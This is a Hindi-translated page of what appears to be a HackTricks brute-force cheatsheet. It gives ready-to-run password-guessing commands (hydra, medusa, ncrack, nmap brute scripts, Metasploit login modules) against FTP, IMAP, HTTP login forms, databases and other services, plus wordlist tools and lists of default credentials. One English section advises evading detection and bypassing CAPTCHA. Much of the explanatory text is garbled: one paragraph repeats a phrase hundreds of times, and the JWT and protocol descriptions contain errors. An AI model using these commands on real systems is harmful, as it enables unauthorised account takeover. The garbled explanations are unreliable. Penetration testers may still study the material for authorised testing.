# Brute Force - चीटशीट

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** बनाएं जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें**।

</details>

## डिफ़ॉल्ट क्रेडेंशियल्स

उपयोग हो रही तकनीक के डिफ़ॉल्ट क्रेडेंशियल्स के लिए **गूगल में खोजें**, या इन लिंक का प्रयास करें:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl एक खोज और विश्लेषण उपकरण है जो वेबसाइटों से विशेषताओं और शब्द सूचियों को खींचकर निकालता है। यह एक ब्रूटफोर्स अटैक के लिए उपयोगी हो सकता है, जहां आप उपयोगकर्ता नाम, पासवर्ड या अन्य संभावित प्रवेश तत्वों की सूची बनाना चाहते हैं। इसे उपयोग करके, आप वेबसाइटों के लिए शब्द सूचियों को खोज सकते हैं और उन्हें ब्रूटफोर्स अटैक के लिए उपयोग कर सकते हैं।

इसका उपयोग करने के लिए, आपको Cewl को वेबसाइट के URL के साथ चलाना होगा और फिर यह वेबसाइट के पृष्ठों को खींचकर उनमें से शब्द सूचियों को निकालेगा। आप इसे विभिन्न विशेषताओं के लिए भी विन्यासित कर सकते हैं, जैसे कि न्यूज़लेटर, ब्लॉग, यूआरएल, शीर्षक, शीर्षक और अधिक।

एक बार जब Cewl शब्द सूचियों को निकाल लेता है, आप उन्हें ब्रूटफोर्स अटैक के लिए उपयोग कर सकते हैं। आप इन शब्द सूचियों को उपयोग करके उपयोगकर्ता नाम, पासवर्ड या अन्य प्रवेश तत्वों की सूची बना सकते हैं और उन्हें ब्रूटफोर्स अटैक के लिए उपयोग कर सकते हैं।

यह एक उपयोगी उपकरण है जो ब्रूटफोर्स अटैक के लिए शब्द सूचियों को खोजने में मदद कर सकता है और इसे पेंटेस्टिंग और सुरक्षा परीक्षण के दौरान उपयोगी साबित हो सकता है।
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

अपराधी के बारे में आपके ज्ञान पर आधारित पासवर्ड उत्पन्न करें (नाम, तारीखें...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

एक वर्डलिस्ट जेनरेटर टूल, जो आपको एक सेट के शब्दों की आपूर्ति करने की अनुमति देता है, जिससे आप दिए गए शब्दों से कई विभिन्न रूपांतरण बना सकते हैं, एक विशेष लक्ष्य के संबंध में उपयुक्त और अद्वितीय वर्डलिस्ट बनाने की संभावना प्रदान करता है।
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### शब्द-सूचियाँ

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **वर्कफ़्लो** बनाएं और **स्वचालित** करें जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## सेवाएं

सेवाओं के नाम के क्रम में व्यवस्थित किया गया है।

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) एक नेटवर्क प्रोटोकॉल है जो वेब सर्वर और वेब एप्लिकेशन सर्वर के बीच संचार को संभव बनाता है। यह एक बारीकीपूर्ण प्रोटोकॉल है जो वेब सर्वर के लिए डायनामिक वेब एप्लिकेशन को बनाने और प्रबंधित करने की क्षमता प्रदान करता है। AJP का उपयोग वेब सर्वर के लिए लोकल और दूरस्थ संचार के लिए किया जाता है।

AJP का उपयोग ब्रूट फोर्स हमलों में किया जा सकता है। इसमें हमलावर एक वेब सर्वर के खाते के लिए अनगिनत प्रयास किए जाते हैं ताकि उन्हें सही पासवर्ड का पता लगा सकें। यह एक प्रभावी तकनीक है जो ब्रूट फोर्स हमलों को अधिक सुरक्षित बनाने के लिए उपयोग की जाती है।

ब्रूट फोर्स हमलों के दौरान, AJP कनेक्शन को स्थापित करने के लिए एक वेब सर्वर के खाते के लिए अनगिनत पासवर्ड प्रयास किए जाते हैं। यदि सही पासवर्ड मिल जाता है, तो हमलावर वेब सर्वर में सफलतापूर्वक प्रवेश कर सकता है। इसलिए, ब्रूट फोर्स हमलों के दौरान AJP कनेक्शन को संदेशों के लिए ध्यान से मॉनिटर करना आवश्यक होता है।
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# Cassandra

Cassandra एक खुला स्रोत डेटाबेस है जो विशेष रूप से विशाल मात्रा में डेटा को संग्रहीत करने के लिए डिज़ाइन की गई है। यह डेटाबेस विभिन्न डेटा सेंटरों में डेटा को वितरित करने की क्षमता रखता है, जिससे उच्च उपलब्धता और त्रुटि सहनशीलता प्रदान करता है।

## ब्रूट फ़ोर्स

ब्रूट फ़ोर्स एक हैकिंग तकनीक है जिसमें हम एक विशेषता के लिए संभावित सभी संभावित मान्यताओं की कोशिश करते हैं। इस तकनीक का उपयोग करके हम उपयोगकर्ता नाम, पासवर्ड, या किसी अन्य प्रमाणीकरण जानकारी को खोजने की कोशिश कर सकते हैं। यह एक अद्यतित और असुरक्षित पाठ्यक्रम है, जिसे अक्सर निष्पादित किया जाता है। इसलिए, यह अवैध गतिविधियों के लिए उपयोग करना अवैध है और नियमों का उल्लंघन करता है।

ब्रूट फ़ोर्स अटैक करने के लिए हम एक शब्दकोश या शब्द सूची का उपयोग कर सकते हैं जिसमें संभावित पासवर्ड या उपयोगकर्ता नाम शामिल हो सकते हैं। हम इस शब्दकोश को एक ब्रूट फ़ोर्स टूल के साथ उपयोग करके अपनी कोशिशों की संख्या को बढ़ा सकते हैं। इसके अलावा, हम ब्रूट फ़ोर्स अटैक के लिए कस्टम स्क्रिप्ट भी लिख सकते हैं।

ब्रूट फ़ोर्स अटैक के द्वारा हम अक्सर अनुमान लगा सकते हैं कि उपयोगकर्ता नाम या पासवर्ड क्या हो सकता है। यह तकनीक अक्सर असुरक्षित पासवर्डों को खोजने के लिए उपयोग की जाती है, जो उपयोगकर्ताओं द्वारा उपयोग किए जाने वाले आम पासवर्डों की सूची में शामिल हो सकते हैं।

ब्रूट फ़ोर्स अटैक के द्वारा हम अक्सर अनुमान लगा सकते हैं कि उपयोगकर्ता नाम या पासवर्ड क्या हो सकता है। यह तकनीक अक्सर असुरक्षित पासवर्डों को खोजने के लिए उपयोग की जाती है, जो उपयोगकर्ताओं द्वारा उपयोग किए जाने वाले आम पासवर्डों की सूची में शामिल हो सकते हैं।
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB एक खुला स्रोत डॉक्यूमेंट डेटाबेस है जिसे Apache Software Foundation द्वारा विकसित किया गया है। यह एक NoSQL डेटाबेस है जो डेटा को JSON दस्तावेज़ों के रूप में संग्रहीत करता है। CouchDB का उपयोग विभिन्न वेब एप्लिकेशन और मोबाइल ऐप्स में किया जा सकता है।

#### ब्रूट फोर्स अटैक

ब्रूट फोर्स अटैक एक हैकिंग तकनीक है जिसमें हम एक विशेषता को उपयोग करके एक उपयोगकर्ता खाते के लिए संभावित पासवर्ड की सूची को प्रयास करते हैं। यह एक प्राथमिक और साधारण तरीका है जिसका उपयोग किसी भी खाते को हैक करने के लिए किया जा सकता है। ब्रूट फोर्स अटैक के द्वारा, हैकर लंबे समय तक अनगिनत पासवर्ड की संभावनाओं की सूची को प्रयास करता है ताकि वह सही पासवर्ड को खोज सके। यह तकनीक अक्सर अनुमानित पासवर्ड की खोज करने के लिए उपयोगी होती है।

#### ब्रूट फोर्स अटैक के लिए उपकरण

कुछ उपकरण ब्रूट फोर्स अटैक को संभावित पासवर्ड की सूची को प्रयास करने के लिए आसान बनाते हैं। ये उपकरण अक्सर एक विशेषता को उपयोग करते हैं जिसके द्वारा वे अनुमानित पासवर्ड की सूची को आवश्यकतानुसार बदल सकते हैं। कुछ उपकरणों के उदाहरण हैं:

- Hydra
- Medusa
- Ncrack

इन उपकरणों का उपयोग करके आप ब्रूट फोर्स अटैक को अपनी आवश्यकतानुसार विन्यासित कर सकते हैं और उपयोगकर्ता खातों की सुरक्षा को मजबूत कर सकते हैं।
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
# Docker रजिस्ट्री

Docker रजिस्ट्री एक सेवा है जो Docker कंटेनर इमेजों को संग्रहीत करने और प्रबंधित करने की अनुमति देती है। यह एक सेंट्रलाइज़्ड स्थान है जहां Docker इमेजों को संग्रहीत किया जाता है और उन्हें अन्य उपयोगकर्ताओं के लिए उपलब्ध कराया जा सकता है।

ब्रूट फोर्स एक तकनीक है जिसमें हम एक विशेषता की संभावित मान्यता के लिए संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित मान्यता के सभी संभावित
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch एक खोज और विश्लेषण इंजन है जिसे विभिन्न उद्देश्यों के लिए उपयोग किया जा सकता है। यह एक खुला स्रोत सॉफ्टवेयर है और विभिन्न प्लेटफ़ॉर्मों पर चलाया जा सकता है। Elasticsearch डेटा को तेजी से खोजने और विश्लेषण करने की क्षमता रखता है, जिससे उपयोगकर्ताओं को बेहतर खोज परिणाम प्राप्त करने में मदद मिलती है।

Elasticsearch को ब्रूट फोर्स अटैक के लिए उपयोग किया जा सकता है। ब्रूट फोर्स एक तकनीक है जिसमें हम एक बड़ी संख्या में संभावित पासवर्ड की कोशिशें करते हैं ताकि हम उचित पासवर्ड को खोज सकें। Elasticsearch के लिए ब्रूट फोर्स अटैक करने के लिए, हम एक पासवर्ड सूची का उपयोग कर सकते हैं और उसे Elasticsearch के लॉगिन पृष्ठ पर एक्सेस करने के लिए उपयोग कर सकते हैं। यह हमें उचित पासवर्ड को खोजने में मदद कर सकता है और अनधिकृत उपयोगकर्ताओं को रोकने में सहायता प्रदान कर सकता है।

ब्रूट फोर्स अटैक करने के लिए, हम एक ब्रूट फोर्स टूल का उपयोग कर सकते हैं जैसे कि Hydra या Burp Suite Intruder। इन टूल्स का उपयोग करके हम एक्सेस क्रेडेंशियल्स की संभावित मान्यता की कोशिशें कर सकते हैं और Elasticsearch पर ब्रूट फोर्स अटैक कर सकते हैं।

ब्रूट फोर्स अटैक करने के दौरान, हमें ध्यान देने की आवश्यकता होती है कि हम एक अच्छी पासवर्ड सूची का उपयोग करें और उचित संख्या में प्रयास करें ताकि हमें सफलता मिल सके। इसके अलावा, हमें ब्रूट फोर्स अटैक के लिए एक अच्छा वर्डलिस्ट टूल का उपयोग करना चाहिए जो हमें विभिन्न पासवर्ड की संभावित मान्यता की कोशिशें करने में मदद कर सकता है।

ब्रूट फोर्स अटैक करने के दौरान, हमें ध्यान देने की आवश्यकता होती है कि हम अधिकतम प्रयासों की सीमा निर्धारित करें ताकि हमें लॉकआउट से बचाया जा सके। इसके अलावा, हमें ब्रूट फोर्स अटैक के लिए एक अच्छा वर्डलिस्ट टूल का उपयोग करना चाहिए जो हमें विभिन्न पासवर्ड की संभावित मान्यता की कोशिशें करने में मदद कर सकता है।
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) एक प्रोटोकॉल है जिसका उपयोग फ़ाइलों को एक सिस्टम से दूसरे सिस्टम में स्थानांतरित करने के लिए किया जाता है। यह एक असुरक्षित प्रोटोकॉल है, जिसका मतलब है कि डेटा को अग्रेषित रूप से भेजा जाता है और इसे एक्रॉस नेटवर्क में आसानी से स्निप किया जा सकता है।

FTP ब्रूट फ़ोर्स हमला एक तकनीक है जिसमें हम एक विशेषता को उपयोग करके एक FTP सर्वर पर उपयोगकर्ता नाम और पासवर्ड की सूची को आवश्यकतानुसार चेक करते हैं। यह तकनीक उपयोगकर्ता नाम और पासवर्ड की सूची को ब्रूट फ़ोर्स या डिक्शनरी अटैक के रूप में भी जाना जाता है।

ब्रूट फ़ोर्स हमला करने के लिए, हम एक ब्रूट फ़ोर्स टूल का उपयोग कर सकते हैं जैसे कि Hydra, Medusa, या Patator। ये टूल्स एक विशेषता को उपयोग करके एक FTP सर्वर पर उपयोगकर्ता नाम और पासवर्ड की सूची को चेक करने के लिए विभिन्न प्रोटोकॉल्स का उपयोग करते हैं।

ब्रूट फ़ोर्स हमला करने के लिए, हम एक विशेषता को उपयोग करते हैं जिसमें हम एक उपयोगकर्ता नाम और पासवर्ड की सूची को चेक करते हैं। यदि सही उपयोगकर्ता नाम और पासवर्ड मिल जाते हैं, तो हम सफलतापूर्वक FTP सर्वर में लॉगिन कर सकते हैं।

ब्रूट फ़ोर्स हमला करने के लिए, हम एक डिक्शनरी अटैक का भी उपयोग कर सकते हैं जिसमें हम एक विशेषता को उपयोग करके एक FTP सर्वर पर उपयोगकर्ता नाम और पासवर्ड की सूची को चेक करते हैं। इस तकनीक में, हम एक पासवर्ड डिक्शनरी का उपयोग करते हैं जिसमें संभावित पासवर्ड की सूची होती है। यदि सही पासवर्ड मिल जाता है, तो हम सफलतापूर्वक FTP सर्वर में लॉगिन कर सकते हैं।
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTP जेनेरिक ब्रूट

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP बेसिक ऑथेंटिकेशन
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - पोस्ट फॉर्म

Brute forcing a login form is a common technique used to gain unauthorized access to a web application. In this method, an attacker systematically tries different combinations of usernames and passwords until a successful login is achieved.

To perform a brute force attack on an HTTP POST form, follow these steps:

1. Identify the login form: Inspect the HTML source code of the web page to locate the login form. Look for the `<form>` tag with the `method` attribute set to `POST`.

2. Capture the request: Use a proxy tool like Burp Suite or OWASP ZAP to intercept the login request. This will allow you to analyze and modify the request before it reaches the server.

3. Automate the attack: Write a script or use a tool like Hydra or Medusa to automate the brute force attack. Configure the script or tool to send POST requests with different combinations of usernames and passwords.

4. Handle response codes: Analyze the response codes received from the server. A response code of 200 indicates a successful login, while codes like 401 or 403 indicate authentication failures.

5. Implement rate limiting: To avoid detection and account lockouts, implement rate limiting in your script or tool. This will limit the number of requests sent per second or minute.

6. Use wordlists: Utilize wordlists containing common usernames and passwords to increase the chances of success. You can find various wordlists online or create your own.

7. Customize the attack: Modify the script or tool to handle specific scenarios, such as detecting and bypassing CAPTCHA or handling session cookies.

8. Monitor and log: Keep track of the login attempts and their outcomes. This will help you analyze the effectiveness of your attack and make necessary adjustments.

Remember, brute forcing a login form is an aggressive attack that can be illegal and unethical if performed without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any form of hacking or penetration testing.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s** के लिए आपको "http-post-form" से "**https-post-form"** में बदलना होगा

### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP (Internet Message Access Protocol) एक प्रोटोकॉल है जो ईमेल क्लाइंट को ईमेल सर्वर से ईमेल डेटा को एक्सेस करने की अनुमति देता है। IMAP का उपयोग ईमेल को रिमोटली एक्सेस करने के लिए किया जाता है, जिससे उपयोगकर्ता अपने ईमेल खाते को किसी भी डिवाइस से एक्सेस कर सकते हैं। IMAP के माध्यम से, उपयोगकर्ता ईमेल सर्वर पर संग्रहीत ईमेल को पढ़ सकते हैं, ईमेल को नये फ़ोल्डर में संग्रहीत कर सकते हैं, ईमेल को नये टैग या फ़्लैग से चिह्नित कर सकते हैं, और ईमेल को हटा सकते हैं। IMAP ब्रूट फ़ोर्स अटैक के लिए उपयोगी हो सकता है, जहां हम एक ईमेल खाते के लिए संभावित पासवर्ड की कोशिशें करते हैं।
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC (Internet Relay Chat) एक प्रोटोकॉल है जिसका उपयोग ऑनलाइन चैट और संचार के लिए किया जाता है। यह एक क्लाइंट-सर्वर मॉडल पर काम करता है, जहां क्लाइंट IRC क्लाइंट सॉफ़्टवेयर का उपयोग करके सर्वर से जुड़ते हैं। IRC चैट रूम में उपयोगकर्ताओं को एक-दूसरे के साथ संवाद करने की अनुमति देता है।

IRC ब्रूट फ़ोर्स एक तकनीक है जिसमें हम एक विशेष उपयोगकर्ता खाते के लिए संभावित पासवर्ड की संभावनाओं की जांच करते हैं। इसके लिए, हम एक शब्दकोश (डिक्शनरी) या एक संभावित पासवर्ड की सूची का उपयोग करते हैं और उन्हें एक-एक करके आजमाते हैं ताकि हमें सही पासवर्ड मिल सके। यह एक अवैध तकनीक है और इसका उपयोग केवल वैध अनुमति प्राप्त करने के लिए किया जाना चाहिए।
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

ISCSI (Internet Small Computer System Interface) एक प्रोटोकॉल है जो नेटवर्क के माध्यम से डिस्क ब्लॉक स्टोरेज को एक्सेस करने की सुविधा प्रदान करता है। यह एक खुला प्रोटोकॉल है जिसका उपयोग डेटा संग्रहण और साझा करने के लिए किया जाता है। ISCSI का उपयोग विभिन्न ऑपरेटिंग सिस्टम, सर्वर और संगठनों में संचालित स्टोरेज नेटवर्क को एक्सेस करने के लिए किया जाता है।

ISCSI के उपयोग से, उपयोगकर्ता एक रिमोट सर्वर के साथ संचालित संग्रहण को एक्सेस कर सकते हैं जैसे कि वे अपने स्थानीय संग्रहण को एक्सेस करते हैं। ISCSI का उपयोग करके, उपयोगकर्ता डेटा को सुरक्षित रूप से संग्रहीत कर सकते हैं और उसे अन्य उपयोगकर्ताओं के साथ साझा कर सकते हैं।

ISCSI को ब्रूट फोर्स हमलों के खिलाफ सुरक्षित रखने के लिए कई सुरक्षा उपाय उपलब्ध हैं, जैसे कि शक्तिशाली पासवर्ड नीतियाँ, लॉगिन विफलता की सीमाएं, और अधिक। ISCSI के सुरक्षा सुविधाओं को समझना महत्वपूर्ण है ताकि एक हैकर इस्तेमाल कर सके और इसे अवैध रूप से उपयोग न कर सके।
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Token) एक प्रकार का टोकन है जो डेटा को सुरक्षित रूप से ट्रांस्पोर्ट करने के लिए उपयोग होता है। यह टोकन एक दिग्गज और एक संकेतक का संयोजन होता है, जिसे एक कुंजी के साथ हस्ताक्षरित किया जाता है। यह टोकन डेटा को एन्क्रिप्ट नहीं करता है, लेकिन इसे विश्वसनीयता की जांच के लिए उपयोग किया जाता है।

JWT टोकन में तीन भाग होते हैं: हेडर, प्रतीक और रहस्यमय भाग। हेडर में टोकन के प्रकार और हस्ताक्षर के लिए उपयोग होने वाली एल्गोरिदम की जानकारी होती है। प्रतीक में टोकन के जारी करने वाले व्यक्ति या संगठन की जानकारी होती है। रहस्यमय भाग में टोकन के विश्वसनीयता की जांच के लिए उपयोग होने वाली कुंजी होती है।

